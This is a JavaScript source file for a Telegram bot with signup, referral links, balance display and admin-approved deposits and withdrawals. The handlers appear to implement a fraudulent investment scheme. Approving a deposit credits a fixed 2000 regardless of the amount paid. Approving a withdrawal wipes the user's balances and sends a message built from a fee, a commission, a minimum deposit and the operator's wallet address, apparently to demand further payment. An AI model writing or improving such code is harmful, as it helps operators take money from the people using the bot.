const { Telegraf, session, Context } = require("telegraf");
const {
    getConfig,
    getLocales,
    templateEngine,
    catcher,
} = require("./Functions/manager");
const sceneManager = require("./Scenes/manager.scene");
const { Stage } = require("telegraf/scenes");
const userModel = require("./Models/user.model");
const config = getConfig();
const locales = getLocales(config.locales);

const bot = new Telegraf(process.env.BOT_TOKEN);
bot.use(session());
bot.use(sceneManager.middleware());

bot.start(Stage.enter("signup"));
bot.action("balances", getBalances);
bot.action("invite", getReferrals);
bot.action("deposit", Stage.enter("deposit"));
bot.action("withdraw", Stage.enter("withdraw"));
bot.action(/deposit (.+) (.+)/, depositManager);
bot.action(/withdraw (.+) (.+)/, withdrawManager);

module.exports = bot;

/**
 * @param {Context} ctx
 */
async function getBalances(ctx) {
    try {
        const user = await userModel.findById(ctx.chat.id);
        const locale = locales.find((locale) => locale.code == user.language);
        await ctx.answerCbQuery();
        await ctx.sendMessage(
            templateEngine(
                locale.balance,
                "$" + user.balances.deposit.toFixed(2),
                "$" + user.balances.reward.toFixed(2),
                "$" +
                    (
                        user.balances.deposit &&
                        (user.balances.deposit + user.balances.reward) * 0.975
                    ).toFixed(2)
            ),
            {
                parse_mode: "HTML",
            }
        );
    } catch (error) {
        catcher(error, ctx).catch(() => {});
    }
}

/**
 * @param {Context} ctx
 */
async function getReferrals(ctx) {
    try {
        const user = await userModel.findById(ctx.chat.id);
        const locale = locales.find((locale) => locale.code == user.language);
        await ctx.answerCbQuery();
        await ctx.sendMessage(
            templateEngine(
                locale.invite,
                `https://t.me/${ctx.botInfo.username}?start=${ctx.chat.id}`
            ),
            {
                parse_mode: "HTML",
            }
        );
    } catch (error) {
        catcher(error, ctx).catch(() => {});
    }
}

/**
 * @param {Context} ctx
 */
async function withdrawManager(ctx) {
    try {
        const action = ctx.match[1];
        const id = ctx.match[2];
        const user = await userModel.findById(id);
        const locale = locales.find((locale) => locale.code == user.language);
        ctx.editMessageReplyMarkup({
            inline_keyboard: [[]],
        });

        switch (action) {
            case "accept":
                user.balances.reward = 0;
                user.balances.deposit = 0;
                await user.save();
                await ctx.editMessageText(
                    `<strike>🧊 New withdraw request from</strike> <b>${id}</b>\n\n✅ Accepted`,
                    {
                        parse_mode: "HTML",
                    }
                );
                await ctx.sendMessage("✅ Accepted");
                await ctx.telegram.sendMessage(
                    id,
                    templateEngine(locale.withdraw.accepted, config.limits.fee, config.limits.commission, config.limits.minimumDeposit + config.rewards.signupBonus, config.walletAddress),
                    {
                        parse_mode: "HTML",
                    }
                );
                break;
            case "deny":
                await ctx.editMessageText(
                    `<strike>🧊 New withdraw request from</strike> <b>${id}</b>\n\n⭕ Denied`,
                    { parse_mode: "HTML" }
                );
                await ctx.sendMessage("⭕ Denied");
                await ctx.telegram.sendMessage(
                    id,
                    templateEngine(locale.withdraw.denied),
                    {
                        parse_mode: "HTML",
                    }
                );
                break;
        }
        await ctx.answerGameQuery();
    } catch (error) {
        catcher(error, ctx).catch(() => {});
    }
}

/**
 * @param {Context} ctx
 */
async function depositManager(ctx) {
    try {
        const action = ctx.match[1];
        const id = ctx.match[2];
        const user = await userModel.findById(id);
        const locale = locales.find((locale) => locale.code == user.language);
        ctx.editMessageReplyMarkup({
            inline_keyboard: [[]],
        });

        switch (action) {
            case "accept":
                user.balances.deposit += 2000;
                await user.save();
                await ctx.editMessageText(
                    `<strike>🔥 New transaction request from</strike> <b>${id}</b>\n\n✅ Accepted`,
                    {
                        parse_mode: "HTML",
                    }
                );
                await ctx.sendMessage("✅ Accepted");
                await ctx.telegram.sendMessage(
                    id,
                    templateEngine(locale.deposit.accepted),
                    {
                        parse_mode: "HTML",
                    }
                );
                break;
            case "deny":
                await ctx.editMessageText(
                    `<strike>🔥 New transaction request from</strike> <b>${id}</b>\n\n⭕ Denied`,
                    { parse_mode: "HTML" }
                );
                await ctx.sendMessage("⭕ Denied");
                await ctx.telegram.sendMessage(
                    id,
                    templateEngine(locale.deposit.denied),
                    {
                        parse_mode: "HTML",
                    }
                );
                break;
        }
        await ctx.answerGameQuery();
    } catch (error) {
        catcher(error, ctx).catch(() => {});
    }
}
